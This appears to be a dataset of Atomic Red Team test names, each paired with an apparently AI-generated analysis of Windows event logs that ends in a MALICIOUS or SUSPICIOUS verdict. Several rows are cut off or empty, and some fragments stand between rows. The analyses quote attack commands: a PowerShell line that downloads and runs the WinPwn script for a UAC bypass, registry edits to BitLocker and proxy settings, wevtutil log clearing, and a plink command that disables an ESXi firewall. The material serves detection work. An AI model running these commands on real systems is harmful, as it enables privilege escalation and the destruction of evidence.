Disable Windows Prefetch Through Registry,"Upon reviewing the provided Windows event logs, there are several activities that stand out as suspicious and might indicate a potential compromise or malicious intent:

### Suspicious or Anomalous Behavior:

1. **Event Log Clearance:**
   - Multiple entries in the system logs indicate that event logs were cleared by the user ""admin_test"" (EventID 104). This is a common tactic used by malicious actors to cover tracks and erase evidence of unauthorized activity.
   - Specific logs cleared include System log, Windows PowerShell log, and Security log (EventID 1102).

2. **Command Execution via `wevtutil`:**
   - The Sysmon logs reveal repeated use of `wevtutil` to clear logs (EventID 1), with the process executed by ""SERVER002\\admin_test"". The command `wevtutil.exe cl` was used multiple times, further pointing towards intentional log clearing.

3. **Unexpected Registry Manipulation:**
   - An entry in the Sysmon log shows `cmd.exe` executing a command to modify a registry setting related to the `EnablePrefetcher` (EventID 1). Editing this registry key without clear legitimate intent or requirement could be suspicious, indicating an attempt to alter system performance or behavior.
   - The parent process of this command execution is `wsmprovhost.exe`, which is typically used for Windows Remote Management, potentially indicating lateral movement or remote command execution.

### Potential Indicators of Malicious Activity:

- **Timing and Sequence of Events:**
  - The sequence of log clearance followed by high-integrity command executions with manipulating registry settings, all executed in a close timeframe, suggests a deliberate attempt to modify system settings and eliminate evidence of such action.
  
- **Use of System Utilities:**
  - The use of native Windows utilities (`wevtutil.exe`, `cmd.exe`, `reg.exe`) to potentially execute malicious commands and clear evidence is a common technique used by attackers to blend in with legitimate activities and bypass external security protections.

### Final Assessment:

Taking into consideration the combination of events:
- System, PowerShell, and Security logs being cleared.
- Commands executed with potential to disrupt or manipulate proper system functioning.
- All actions performed under a high-integrity context.

These initiatives suggest that the activities recorded in the logs are not benign and indicate attempts to hide illicit actions.

### Resolution: **MALICIOUS**

The logs contain clear signs of malicious activities, ranging from event log clearance to potentially unauthorized registry modifications, all conducted by a user with high integrity permissions. Immediate investigation is warranted to ensure no further compromise is in place and to preclude potential future risks.

### Next Steps:

1. **Incident Response Procedure:**
   - Engage incident response team to perform thorough investigation.
   - Isolate the compromised host pending further analysis.

2. **Audit & Trace User Activity:**
   - Verify the legitimacy of ""admin_test"" user actions and credentials.
   - Identify any related machines or user accounts possibly affected.

3. **Strengthen Monitoring & Alerts:**
   - Implement more stringent monitoring on event log clearance actions.
   - Enable alerts for anomalous behavior concerning native Windows utilities usage.

4. **Patch and Secure the System:**
   - Ensure all systems are updated with the latest security patches.
   - Review and update access controls and policy settings as necessary.

Taking these steps will help mitigate existing threats and strengthen defenses against such malicious activities in the future."
Rundll32 syssetup.dll Execution,"After reviewing and analyzing the provided Windows event logs, here's a detailed report on the findings:

1. **Clear Pattern of Log Clearing Activities**:
   - **Security Event Log (EventID: 1102)** and **System Event Log (EventID: 104)** both indicate that logs have been cleared, with the user `SERVER002\admin_test` as the initiator. The consistent use of wevtutil.exe for clearing various logs, including Security, System, and Windows PowerShell logs, suggests an attempt to erase tracks, which is a common tactic used in post-exploitation scenarios.
   - These actions are traditionally indicative of malicious intent as attackers often clear logs to cover up their activity once they’ve infiltrated a system.

2. **Suspicious Use of PowerShell**:
   - The use of `powershell.exe` by the user `admin_test` indicates the potential use of PowerShell scripting for malicious purposes. PowerShell is a powerful tool that can be exploited for lateral movement, data exfiltration, and command execution.

3. **Utilization of Rundll32 with Suspicious Command**:
   - There is an execution of `rundll32.exe syssetup.dll,SetupInfObjectInstallAction` pointing to a path within `C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\T1218.011\src\T1218.011_DefaultInstall.inf`, which could potentially indicate an abuse of `rundll32.exe` for executing a potentially harmful INF file. This behavior aligns with execution techniques used in certain attack simulations and campaigns, commonly documented in threat emulation frameworks like Atomic Red Team.

4. **Execution of Command-Line Tools**:
   - Tools like `hostname.exe` and `whoami.exe` together in quick succession is typically used during the reconnaissance phase to gather information about the system and the current user's permissions. While these tools alone do not signify malicious activity, their context amid other suspicious activities could bolster evidence of an intrusion.
   
5. **Launch of cmd.exe**:
   - The execution of `cmd.exe` with the aforementioned suspicious command is highly indicative of command-line abuse potentially associated with malicious activity.

**Assessment**:
Based on the analysis of the logs, the following can be concluded:
- The repeated and purposeful clearing of logs combined with the execution of potentially exploitative command lines and tools represents a strong indicator of malicious activity.
- The use of system utilities (e.g., `wevtutil`, `rundll32`, `cmd.exe`) in ways that align with known attack techniques suggests a compromised host, warranting immediate attention.

**Final Resolution**: **MALICIOUS**

**Guidance on How to Proceed**:
1. **Immediate Isolation**: Consider isolating the affected host to prevent further potential spread or communication with attacker-controlled infrastructure.
2. **Forensic Analysis**: Conduct a detailed forensic investigation to identify the root cause and potentially compromised accounts or data.
3. **Revert or Restore**: If possible, restore the system from a known good backup after ensuring the threat has been contained.
4. **Review Access Logs and Permissions**: Check for unauthorized access and ensure that credentials used (e.g., `admin_test`) are reviewed, potentially reset, and audited.
5. **Enhance Monitoring**: Increase monitoring and alerting on similar patterns to identify any further attempts across the network."
Modify UseTPMKeyPIN Registry entry,"Upon analyzing the provided logs from various channels, several suspicious behaviors that stand out are:

1. **Event Log Clearing**: 
   - There are entries indicating that someone with the username ""admin_test"" cleared various event logs, specifically the Security, System, and Windows PowerShell logs. This is evidenced by entries with EventID 1102 in the Security log and EventID 104 in the System log. Such activities are typically associated with malicious intent as attackers may clear logs to cover their tracks after exploiting systems.

2. **Time Manipulation**:
   - There are multiple entries with EventID 4616 about the system time being changed. Time manipulation can be a tactic used by attackers to adjust event timestamps to confuse incident response efforts or avoid detection mechanisms that rely on time-based anomalies.

3. **Usage of Sysinternals Utilities**:
   - There are Sysmon logs indicating the usage of ""wevtutil.exe"" to clear logs, which aligns with the log clearance activity. This utility is often used by attackers to view and manipulate Windows logs.

4. **Suspicious Command Execution**:
   - The PowerShell logs are notably missing, potentially cleared. Without further information from PowerShell logs, any unusual scripts or command execution cannot be determined, but the clearing itself supports potential malicious activity.

5. **Registry Modifications**:
   - A Sysmon event shows a command executed via `cmd.exe` to modify the registry key related to use of TPM in encryption policies (`reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UseTPMKeyPIN /t REG_DWORD /d 2 /f`). This kind of modification may indicate an attempt to alter BitLocker policies, which could have security implications if done maliciously.

### Assessment
The combination of log clearing, time manipulation, and registry modifications suggests attempts to obfuscate actions and potentially alter system behavior. While none of these alone are definitive evidence of compromise, collectively they create a scenario that justifies further investigation.

### Recommendation
Based on the analysis, the assessment of the logs is categorized as **SUSPICIOUS**. There is a strong need for further investigation into the actions of the ""admin_test"" user account, potential access to the affected machine, and review of other security controls (such as AV logs or network logs) for indicators of exploitation or unauthorized access. Immediate actions should include:
- Verification of recent changes to user privileges and group memberships.
- A detailed forensic investigation of systems files and any decrypted data.
- Close monitoring of network activity from and to Server002.
- Reassessing and reinforcing access controls to sensitive operations such as log clearing and time changes.

This analysis is based on the available log entries and might change with additional context or information."
MSBuild Bypass Using Inline Tasks (VB),"Based on the analysis of the provided log entries from a Windows host, here are the key observations:

"
Enable Proxy Settings,"Upon reviewing the provided logs, I have made the following observations:

1. **Log Clearing Activity**:  
   - Multiple instances of event logs being cleared were recorded, indicated by the command `wevtutil.exe cl`. This was done under the user `admin_test`. Event log clearing is a known method employed by attackers to cover their tracks.
   - Security, System, and Windows PowerShell logs were cleared, which is highly suspicious behavior, especially considering it was done across multiple critical logs.

2. **Unusual Process Execution**:  
   - There is evidence of PowerShell and command line tools being used with elevated privileges (High integrity level), specifically `reg.exe` through `cmd.exe` to modify registry settings for the internet proxy (`/v ProxyEnable /t REG_DWORD /d 1 /f`). This could indicate a configuration change possibly indicative of command and control (C2) setup or network redirection for malicious purposes.
   - Commands like `whoami.exe` and `hostname.exe` being executed can often be benign. However, when paired with suspicious activities such as log clearing, it could be part of reconnaissance efforts by an intruder.

3. **SVCHOST and TimeChange**:  
   - There are `svchost.exe` activities and Kernel-General events related with time modifications which are usually benign, but can sometimes be related to persistence mechanisms or confusion techniques in sophisticated attacks. These taken by themselves are not overtly suspicious but contextually could be relevant due to other findings.

4. **Potentially Malicious Indicators**:  
   - The use of `wevtutil.exe` to clear various event logs, especially in conjunction with `cmd.exe` and `reg.exe` manipulation to enable a proxy setting, suggests potential malicious script or automated activity aiming to establish stealth and potentially exfiltration pathways.

Based on the analysis:

- The log clearing activity by a user with admin privileges on critical logs (Security, System, Powershell) and using an account named `admin_test`.
- Registry changes altering proxy settings likely represent unauthorized changes.
- The sequence and nature of commands used indicate suspicious behavior possibly consistent with an intrusion or malicious intent.

WinPwn - UAC Magic,"**Detailed Analysis of the Logs:**

1. **Windows PowerShell Log:**
   - The PowerShell logs indicate the execution of a script from a potentially malicious URL. The script is executed via:
     ```
     powershell.exe & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'
     iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
     UACBypass -noninteractive -command ""C:\windows\system32\cmd.exe"" -technique magic}
     ```
   - This pattern indicates an attempt to download and execute a script from GitHub, potentially a penetration testing or exploitation tool. The use of `UACBypass` is particularly suspicious as it suggests privilege escalation attempts.

2. **Application Log:**
   - The logs indicate that Windows Defender is in an active state which implies some level of protection, but does not provide any indication of the events generated as a result of suspicious activity.
   - No anomalous or specifically malicious activity directly noted in these logs, apart from the confirmation of Windows Defender operations.

3. **Security Log:**
   - The Event ID 1102 indicates that the security log has been cleared, which is a significant red flag. Log clearance is often performed to cover tracks following an unauthorized or suspicious operation.
   - Security events such as 4624 (An account was successfully logged on) and 4672 (Special privileges assigned to new logon) being logged could relate to regular user activities, but the simultaneous clearing of the logs amplifies the suspicion of these actions.
   - The account `admin_test` has been granted several powerful privileges (e.g., SeDebugPrivilege), which can be exploited by malicious actors if obtained.

4. **System Log:**
   - Similar to the Security logs, clearing of System logs is observed with Event ID 104. This is often used as a technique to hide malicious activity by removing evidence of previous log entries.

5. **Sysmon Log:**
   - Multiple Sysmon log entries detailing command-line executions using `wevtutil.exe` to clear logs through specific channels (Security, Application, System) indicate a deliberate attempt to remove traces of activities.
   - The PowerShell execution descriptions, such as downloading from an external source and executing `UACBypass`, demonstrate strong indicators of malicious activity focused on obtaining elevated privileges illegally.

**Assessment and Resolution:**

Given the combination of these factors:
- The execution of PowerShell scripts from an external repository with exploitative intentions.
- The deliberate log clearance actions detected indicating potential attempts to conceal unauthorized activities.
- The assignment of elevated privileges to a user account, `admin_test`, potentially indicating privilege escalation attempts.

The log entries collectively exhibit clear signs of malicious activity. The behavior strongly suggests an attempt to exploit the system using advanced scripted attacks coupled with concealment tactics (log clearance).

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**
- Isolate the affected system immediately to prevent further compromise or lateral movement.
- Conduct a detailed forensic analysis on the system to determine the full scope of the compromise.
- Review and further investigate PowerShell and other script usage on the network.
- Change all passwords, especially for privileged accounts such as `admin_test`.
- Implement strict PowerShell execution policies and improve logging practices to prevent tampering.
- Engage incident response teams to contain and remediate any breach impact caused by this malicious activity."
Delete TeamViewer Log Files,"Upon reviewing the provided log entries from the Windows host, a few concerns and notable activities arise:

1. **PowerShell Activity**: 
   - The PowerShell events (EventID: 600) show a command executing that involves creating and then deleting a file at `$env:TEMP\TeamViewer_54.log`. The command could be benign if associated with regular administrative duties or processes. However, this pattern (creation and immediate deletion) can sometimes be associated with attempts to either test permissions/access or disguise malicious scripts. The heavy use of `ErrorAction Ignore` might suggest attempts to suppress errors, which is often used to hide potential scripts' errors.

2. **Log Clearing**:
   - Several `wevtutil.exe cl` (clear) commands are observed in the Sysmon logs, clearing different logs like Sysmon/Operational, Security, Application, System, and Windows PowerShell. This activity is significant as it matches patterns of an attacker trying to cover tracks by clearing event logs that might capture evidence of suspicious activity.
   - Corresponding with the system logs (EventID: 104), logs for various channels being cleared by the user `admin_test`.

3. **Time Changes**:
   - Security logs (EventID: 4616) and Kernel-General logs indicate system time modification or synchronization activities. Although such events can occur as part of normal Windows time service operations, they warrant attention when combined with other suspicious activities such as log clearing.

4. **Service and Process Activity**:
   - The Sysmon logs reveal multiple entries for `MicrosoftEdgeUpdate.exe` and related setup executables. There are numerous process creation events with these executables. The task itself appears like a regular update process, preparing and executing updates for Microsoft Edge. This seems benign unless any of these executables or their locations are suspect.
   
5. **General Observation**:
   - User `SERVER002\admin_test` is involved in executing nearly all notable actions, indicating privileged access. If this was not expected, it could imply compromise or misuse of administrator credentials.

### Final Assessment:

Given the presence of both legitimate system and application processes (like Edge Update) and the concerning activities around log file clearing and suspicious PowerShell commands, I categorize this activity as:

**SUSPICIOUS**

### Guidance:

1. **Immediate Steps**:
   - Investigate the user account `admin_test` for potential misuse or compromise. Confirm if this account should be executing these actions.
   - Examine network activity or endpoint detection logs for further context around the date and time of these entries.
   - Cross-reference the cleared logs with backup logs, if available, to restore valuable monitoring data.

2. **Security Measures**:
   - Implement stricter access controls and monitoring on PowerShell usage.
   - Reinforce logging and alerting systems to promptly react to similar events, particularly events involving log clearing.
   - Consider user behavior analytics to detect anomalies in high-privileged account activities.

3. **Further Investigation**:
   - Dig deeper into any specific instances of odd or unusual updates: ensure hashes and executable locations align with known good values.
   - Conduct a thorough review of the system for any remnants of removed scripts or indicators of other malicious tools."

   - Time change events:
     - Events indicate changes to system time, which can be used for anti-forensics (altering time to mislead digital investigations).
   
2. **Sysmon Logs**:
   - Usage of `wevtutil.exe` (Eventing Command Line Utility):
     - Typically used for managing event logs, seeing commands like ""wevtutil cl <log name>"" indicates clearing of logs which aligns with the events seen in the System logs.
   - Suspicious `cmd.exe` and `reg.exe` activity:
     - The command `""cmd.exe"" /c reg add ...` was executed to add registry keys targeting `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\MyComputer\BackupPath` pointing to `notepad.exe`. This is unusual and may indicate attempts at persistence by setting a startup item or performing a malicious action disguised as a benign utility.
   - High frequency of these processes spawning (conhost, wevtutil, cmd) at a high integrity level especially post-log clearing actions raises suspicions.
   
3. **EdgeUpdate Activities**:
   - Legitimate-looking activities related to Microsoft Edge Update occur under the user `NT AUTHORITY\SYSTEM`. These seem routine for updates.

### Summary:

The logs contain activities that are highly indicative of suspicious behavior:
- Clearing of event logs by an administrator account suggests an attempt to cover one's activity.
- Manipulation of registry keys in a potentially unusual context or method.
- Changes to system time could be an indicator of anti-forensic measures.

ESXi - Disable Firewall via Esxcli,"Upon examining the provided Windows event logs, several activities stand out as potentially suspicious:

1. **Process Execution and Clearing of Logs:**
   - The `wevtutil.exe` utility was used under the user `SERVER002\admin_test` to clear multiple event logs, including ""Microsoft-Windows-Sysmon/Operational"", ""Application"", ""System"", ""Security"", and ""Windows PowerShell"" logs. 
   - Specifically, Sysmon ID 1 and ID 5 events displayed the use of `wevtutil.exe` with the command line indicating an intent to clear logs: `\""C:\\Windows\\system32\\wevtutil.exe\"" cl [channel name]`.

2. **Use of Plink for SSH:**
   - An instance of `cmd.exe` was used to execute a command running `plink.exe` from the ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\ExternalPayloads\\"" directory. The command was aimed at connecting to `atomic.local` via SSH as `root`, with a command to disable an ESXi firewall using a script (`esxi_disable_firewall.txt`). This indicates potential unauthorized remote command execution.

3. **General Observations:**
   - The user `admin_test` executed multiple `conhost.exe` processes, a behavior often seen accompanying command-line operations.
   - Microsoft Edge Update processes were seen, which appear to be legitimate software updates, suggesting some benign activity is interspersed.

The combination of using `wevtutil.exe` to clear logs and executing potentially harmful SSH connections with `plink.exe` raises significant red flags indicative of malicious activity. Clearing event logs is a common technique used to cover tracks after unauthorized access or malicious operations.

**Assessment and Resolution:**
- **MALICIOUS:** The logs contain clear evidence of malicious activities, including suspicious use of shell commands and event log clearing by an admin user. Immediate investigation is required to determine the extent of the compromise and mitigate any potential damage.

**Guidance:**
- Immediately revoke access for the account `SERVER002\admin_test`, as it appears to be compromised or being used maliciously.
- Conduct a full forensic investigation to assess any changes made during the session.
- Check the integrity and configuration of any systems that may have been targeted, such as the ESXi server mentioned in the `plink.exe` command.
- Consider implementing stricter monitoring and alerting on anomalous behavior involving administrative accounts and sensitive commands like `whoami.exe`, `hostname.exe`, and `wevtutil.exe`.
- Ensure endpoint protection solutions are updated and scanning for any other IOC's (Indicators of Compromise) linked to this activity."
Msiexec.exe - Execute Local MSI file with an embedded EXE,"Upon analyzing the provided Windows event logs, I have identified several indicators of potentially suspicious activity that merit further investigation:

1. **Log Clearing Events:**
   - Security log event with `EventID 1102` indicates that the Security log was cleared by the user `admin_test`.
   - System log events with `EventID 104` indicate that the System and Windows PowerShell logs were cleared by the same user `admin_test`.

   The clearing of these logs in close succession is often indicative of an attempt to remove traces of malicious activity or unauthorized access.

2. **Process Execution:**
   - The execution of `wevtutil.exe` to clear specific log channels (Sysmon, Application, System, and Windows PowerShell) is uncommon and further raises suspicion. The command lines noted in the logs such as `wevtutil.exe cl Security` suggest deliberate log clearing actions.
   - Execution of `cmd.exe` with the command that installs a file from a temporary location which includes a potentially suspicious MSI installation file (`T1218.007_EXE.msi`). The file path and command resemble activity related to the Atomic Red Team, which is known for simulating adversarial techniques for testing purposes.
   - The presence of Sysmon logs showing process executions completes the scope of processes likely involved in these activities, specifically `msiexec.exe` being launched with the MSI package.

3. **Atomic Red Team Indicators:**
   - The presence of executed processes relating to Atomic Red Team (e.g., related to T1218.007 technique) suggests this may have been a controlled or sanctioned purple team exercise or red team testing within the environment.

**Assessment:**
- **SUSPICIOUS:** The activity observed in the logs is suspicious primarily due to the log-clearing actions executed by a user with administrative permissions, combined with the execution of potentially simulation-related processes that could indicate a test of detection capabilities. However, without additional context such as verifying this was an approved test, it cannot be definitively labeled as malicious.

**Recommendations:**
- Verify with relevant teams if the operations involving Atomic Red Team were authorized and part of a legitimate security test.
- Review any security monitoring alerts that might have been triggered around the time of these events.
- Check for any additional context involving user `admin_test` or activities around the same timeframe.
- Enhance monitoring and alerting on log manipulation activities to quickly identify and respond to any unauthorized access or potential breach attempts."
Azure - Eventhub Deletion,"**Analysis of the Logs:**

1. **PowerShell Logs:**
   - The PowerShell script executed (`powershell.exe & {$secure_pwd = """" | ConvertTo-SecureString -AsPlainText -Force...}`) is suspicious due to the uses of `ConvertTo-SecureString -AsPlainText -Force` with an empty password directly, and subsequent attempt to connect to Azure AD and remove an Event Hub resource.
   - This script could potentially be a malicious attempt to interact with Azure resources without appropriate authentication measures, or might involve unauthorized access or resources manipulation.

2. **Sysmon Logs:**
   - Numerous PowerShell and system utilities (e.g., `wevtutil.exe`, `whoami.exe`, `hostname.exe`) are being executed in a short amount of time. The frequent use of `evntutil.exe` to clear logs and fetch event details raises potential red flags.
   - The `wevtutil.exe` process command involves clearing logs (`cl`) for multiple channels including Security, which can be an attempt to cover tracks after executing suspicious activities.
   - Observation of event logs being cleared by the user `admin_test` across multiple channels (Security, System, and Windows PowerShell) is particularly concerning as it may suggest an attempt to remove traces of potentially malicious actions.
   - Routine creation and execution of setup processes related to Microsoft Edge updates are evident and seem benign. However, these actions can sometimes mask other malicious behaviors due to similar patterns seen with malware using scheduled software updates to disguise operations.

3. **System and Security Logs:**
   - The entries show that the event logs for crucial channels (System, Windows PowerShell, Security) were cleared by a single user `admin_test`.
   - The clear events with event ID `104` for System and Windows PowerShell, and event ID `1102` for Security, further point towards potential attempts to hinder forensic investigations or to hide malicious activity.

4. **Overall Observations:**
   - The clearing of event logs and the execution of certain sensitive operations with PowerShell under the `admin_test` account, especially involving Azure operations, suggests possible malicious intent.
   - The combination of these activities indicates a possible security incident that should be further investigated.

**Threat Assessment and Guidance:**

- **Resolution: MALICIOUS**

Given the combination of suspicious PowerShell commands, the deliberate clearing of the event logs across essential channels likely intended to disrupt traceability, and the high volume of unnecessary execution of system utilities within a very short time frame, this activity appears malicious.

**Guidance on How to Proceed:**

1. **Immediate Steps:**
   - Isolate the affected system (Server002) from the network to prevent further unauthorized access or data exfiltration.
   - Preserve forensics evidence by taking a snapshot or forensic image of the system's current state.

2. **Further Investigation:**
   - Review Azure AD logs and configurations to determine if unauthorized access or resource manipulation occurred.
   - Conduct a thorough investigation of the `admin_test` account to verify its legitimacy and inspect other systems for similar behavior.

3. **Review and Strengthen Security Measures:**
   - Ensure that log retention settings are configured correctly and logging cannot be cleared by non-essential personnel.
   - Verify and enhance security controls, including monitoring configurations, PowerShell execution policies, and access management practices to avoid future incidents."
MSBuild Bypass Using Inline Tasks (C#),"**Analysis of the Event Logs**

The provided logs reveal several indicators of potentially suspicious activities:

1. **Event Log Clearing**:
   - The Security log shows an event (EventID: 1102) indicating the Security log was cleared by the user ""admin_test"", which is captured under the EventRecordID “30353”. This is typically considered suspicious behavior, as attackers may clear logs to cover their tracks after conducting unauthorized activities.
   - The System log shows events (EventID: 104) indicating the clearing of multiple logs including the System and ""Windows PowerShell"" channels by the same user ""admin_test"". Log clearing is generally a red flag and often associated with malicious activity aiming to hinder forensic investigations.

2. **Unusual PowerShell Usage**:
   - A PowerShell instance (ProcessId: 6832) was executed by the user ""admin_test"". While executing PowerShell itself is not necessarily malicious, PowerShell is commonly used in advanced persistent threats (APTs) and other attack scenarios.

3. **Usage of `wevtutil.exe` to Clear Logs**:
   - Multiple Sysmon log entries reveal the use of `wevtutil.exe` by the user ""admin_test"", specifically clearing various event logs channels (like Microsoft-Windows-Sysmon/Operational, Application, System, Security, and ""Windows PowerShell""). This utility can be legitimately used for managing event logs but its use for clearing logs, especially in conjunction with security log clearance, is highly suspicious.

4. **Usage of Compile Tools (`msbuild.exe`, `csc.exe`) in Critical Paths**:
   - Commands involving `cmd.exe` and subsequently compiling CSharp files with `msbuild.exe` and `csc.exe` are seen being executed by the same user. These tools, when used in unusual directories like temporary folders within user profiles (e.g., AtomicRedTeam folders), often indicate attempts to execute and compile potentially harmful scripts or programs.

Overall, the sequence and nature of the events paint a picture of potentially malicious activity:
- The clearing of multiple important system and application logs suggests an attempt to remove traces of activities.
- The PowerShell execution, coupled with the clearing of the PowerShell event log, may suggest the usage of PowerShell for executing scripts or commands that the user does not want logged.
- The use of the event log utility `wevtutil.exe` for clearing logs explicitly matches tactics common in attacker methodologies to cover tracks post-exploitation.

**Assessment:**
- **Resolution: MALICIOUS**
  - The combination of log clearing, unusual PowerShell activity, and compilation of potential payloads strongly suggests malicious behavior designed to achieve persistence, execute unauthorized tasks, and clear evidence.

**Guidance on How to Proceed:**
1. **Immediate Isolation**: Isolate the affected system to prevent further potential damage or data exfiltration.
2. **In-depth Forensic Analysis**: Conduct a comprehensive forensic analysis to uncover any malicious files or scripts left behind.
3. **Audit and Review**: Examine user credentials, particularly those of ""admin_test"", to determine if they have been compromised and take steps to secure or reset them.
4. **Monitor Other Systems**: Ensure similar suspicious activities are not present across other systems within the network.
5. **Review Network Traffic**: Check for any unusual outbound traffic from this host that might indicate data exfiltration efforts."
Create ADS PowerShell,"Based on a detailed analysis of the provided Windows event logs, the following points have been observed:

### Suspicious Activities:
1. **Sysmon Event ID 5 (Process Terminated) and Event ID 1 (Process Creation)**:
   - Multiple instances of `wevtutil.exe` were executed with the command line arguments to clear logs (`cl`). This is a common technique used by attackers to cover their tracks by clearing or querying logs.
   - Subsequent processes involved `conhost.exe`, which often handles console processes, but its association here through specific command-line arguments may be an attempt to disguise operations post log-clearing or to manage console windows without a visual element.

2. **PowerShell Activity**:
   - PowerShell scripts are being executed with command-line input involving `set-content` and manipulation of alternate data streams (ADS), as observed, which is an uncommon behavior typical of sophisticated attack techniques to hide commands or data, often flagged under Tactics, Techniques, and Procedures (TTP) in threat detections.

3. **Security, System, and Application Log Events**:
   - Security Event ID 1102 (Log cleared) indicates that the security logs have been cleared by the user `admin_test`. This is a significant indicator of potential malicious activity attempting to erase tracks.
   - System logs also showed similar attributes with logs being cleared by the same user at around the same time frame, which enhances the suspicious behavior of potential log tampering to cover unauthorized actions.

4. **Elevated Privileges Observed**: 
   - Security Event ID 4672 showing 'SYSTEM' user obtained special privileges which include `SeDebugPrivilege` and others that allow a user to bypass typical security policies.

5. **Edge Update Activities**:
   - Despite being a legitimate update client, the frequency and chain of `MicrosoftEdgeUpdate.exe` executions, handled by `SYSTEM`, seems excessive and executed back-to-back, which might imply an attempt to disguise malicious operation under legitimate update processes.

### Conclusion:
The activities observed in the log files, such as the suspicious execution and clearing of logs via `wevtutil.exe`, arbitrary PowerShell scripting with alternate data streams, as well as subsequent user activity under administrative privileges, indicate anomalous behavior suggesting potential malicious intent. Given these observations, the situation is assessed as **MALICIOUS**.

### Recommended Actions:
- **Immediate Containment**: Isolate the affected host from the network to prevent further compromise.
- **Detailed Investigation**: Conduct a full forensic analysis on the affected host to determine the impact and entry point of the compromise.
- **Log Review and Restoration**: Inspect backup logs to identify hidden events and gain insights into what might have been erased or tampered with during the attack.

1. **Sysmon Logs**:
   - Frequent execution of `PowerShell.exe` is noted, which can be a red flag, especially when used by an administrator account like `SERVER002\admin_test`. For example:
     - `powershell.exe` executed by `admin_test` with CommandLine `Invoke-ATHCompiledHelp -SimulateUserDoubleClick -CHMFilePath Test.chm`.
     - Another `powershell.exe` command run with `-ExecutionPolicy Restricted`, combined with complex scripts, suggests scripting activity that requires careful scrutiny.
   - Multiple instances of `wevtutil.exe` are observed being used with the `cl` (clear) command for different event logs (e.g., System, Security, Windows PowerShell), likely clearing event logs.
   - `conhost.exe` instances appear as console windows associated with PowerShell and other executed processes.

2. **Application Logs and Windows PowerShell Logs**:
   - The logs do indicate the starting and stopping of PowerShell providers alongside executed scripts, which supports the Sysmon evidence of PowerShell activity. This, in itself, isn't highly suspicious without more context but merits attention due to the clearing of logs observed.

3. **System Logs**:
   - Logs show frequent Windows Update activity, which appears normal, with several system component updates.
   - Importantly, Event Log cleared messages from a user `admin_test` on critical logs like System and Windows PowerShell, which overlaps the suspicious Sysmon activities.

4. **Security Logs**:
   - Event 1102, indicating that the Security log was cleared, also by the user `admin_test`. This is a significant indicator of suspicious activity as clearing logs is a tactic often used to cover tracks.

**Assessment**:
- The simultaneous execution of PowerShell scripts, the frequent usage of clearing commands on event logs by the same user across different channels, and the clearing of the Security log are highly significant. They collectively suggest possible malicious activity, focused on erasing footprints.

**Resolution**: MALICIOUS

**Guidance**: Immediate steps should include:
- Isolating the affected host (Server002) to prevent further potential compromises.
- Conducting a full forensic investigation to verify the timeline and extent of the unauthorized activities.
- Reviewing security policies for PowerShell execution and event log management.
- Implementing security controls, such as enabling logging for PowerShell and other critical actions, to help identify and mitigate future activities."
Delete an entire folder - Windows PowerShell,"Upon analyzing the provided logs, the following points have been noted:

### Indicators of Potential Malicious Activity:

1. **Log Clearing Events:**
   - The security log shows an Event ID 1102 indicating that logs were cleared by a user named `admin_test`.
   - System logs also show `EventID 104` indicating the clearing of the System and PowerShell logs by the same user.

2. **Usage of Wevtutil:**
   - Multiple instances of the `wevtutil.exe` command were observed being used to clear logs specifically for Sysmon, Application, System, Security, and Windows PowerShell.
   - The usage of Wevtutil to clear event logs is often associated with an attempt to cover tracks from a malicious activity standpoint.

3. **Multiple Command Line Instances:**

Delete Windows Defender Scheduled Tasks,"### Detailed Analysis

The provided logs present a considerable amount of data involving system, security, application, sysmon, and powershell logs. The primary focus is to identify any suspicious activities, especially those suggesting potential malicious behavior or compromise.

#### System and Security Logs:
1. **Event Log Clearing (Event IDs: 104, 1102):** 
   - **System Log (Event ID 104)**: There are multiple entries where the logs have been cleared by a user named `admin_test`. Clearing event logs is a common method used by attackers to cover their tracks. The system and ""Windows PowerShell"" event logs were specifically cleared.
   - **Security Log (Event ID 1102)**: The security event log is also cleared by the same user `admin_test`.

2. **Time Change Events (Event IDs 4616):**
   - The logs document a scenario where the system time was altered backward (Event ID 4616). Time change events executed by `svchost.exe` could be suspicious especially when not part of regular maintenance or updates.

3. **Suspicious User Activity:**
   - The user `admin_test` appears to be central in both clearing logs and executing a range of command-line processes with elevated permissions (integrity level: High).

#### Sysmon Logs Analysis:
1. **Series of Suspicious Commands:**
   - There are multiple `cmd.exe` executions with complex command lines, which manipulate and query Task Scheduler jobs associated with Windows Defender tasks. This involves exporting and conditionally deleting these tasks, which is uncommon unless part of a security test or administrative task.
   
2. **Event Log Manipulation Using `wevtutil.exe`:**
   - The use of `wevtutil.exe` to clear specific event logs (System, Application, Windows PowerShell) further suggests attempts to disrupt system forensic logging capabilities, aligning with suspicious or malicious intent.

#### Other Observations:
- **Process Execution Chains:** 
  - High-frequency execution of various command-line utilities executed in rapid succession (`cmd.exe`, `conhost.exe`, `wevtutil.exe`, `schtasks.exe`, etc.) shows a high level of process activity unmanaged under typical operational scenarios.
  
- **Potential Automation Script Activity:** 
  - The pattern seen with command-line operations might suggest scripted tasks or batch processing potentially employed for malicious activity.

### Assessment:
The combination of event log clearing, time manipulation, and frequent execution of command-line utilities for system administration without automation justification suggests suspicious activity. These actions are indicative of potential malicious behavior but could require more context, such as checking administrative tasks or change logs verifying if these operations were scheduled maintenance activities.

### Resolution: SUSPICIOUS

### Guidance for Further Investigation:
1. **Verify Administrative Actions:**
   - Confirm with system administrators or log change management activities if these actions were scheduled or conducted for a valid reason.

2. **User Validation:**
   - Investigate the `admin_test` account for unauthorized access. Check for any anomalies in login times, IP addresses, or other usage patterns.

3. **Log Recovery and Analysis:**
   - Attempt to recover any impacted logs or cross-reference with other unaffected logging systems to filter substantive benign vs. suspicious/malicious events that align with this timeframe.
   
4. **Threat Hunt:**
   - Conduct a deeper threat hunting activity on the network and the host to ensure no backdoor or rootkit installations have occurred.

5. **Security Deterrent Measures:**
   - Implement stricter access controls and session monitoring on administrative accounts to prevent future log-clearance capabilities without off-site archival or dual approvals."
Msiexec.exe - Execute the DllUnregisterServer function of a DLL,"After analyzing the provided Windows event logs from the machine ""Server002,"" several potentially suspicious activities and patterns emerge:

1. **Log Clearing Events:**
